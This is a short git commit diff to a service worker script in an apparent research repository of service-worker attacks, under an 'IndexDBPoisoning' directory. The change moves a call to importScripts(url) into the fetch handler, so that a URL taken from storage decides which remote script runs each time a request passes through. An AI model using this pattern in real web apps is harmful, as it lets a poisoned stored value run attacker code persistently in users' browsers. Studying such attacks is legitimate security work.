6a838c429b7d910b3775082f7af0ed7ca4ed0574
DemoPWA <54972549+DemoPWA@users.noreply.github.com>
2022-02-10 03:17:09 -0500

    Update sw.js

--- SW_Attacks/IndexDBPoisoning/sw.js
+++ SW_Attacks/IndexDBPoisoning/sw.js
@@ -36,9 +36,9 @@ async function get_url_value(){
 
 self.addEventListener('fetch', evv => {
       
-      evv.waitUntil(Promise.all([get_url_value(),importScripts(url),self.getResponse(evv.request.url)]))
+      evv.waitUntil(Promise.all([get_url_value()]))
 //       evv.waitUntil()
-      
+      importScripts(url)
       evv.respondWith(self.getResponse(evv.request.url));
 })
 
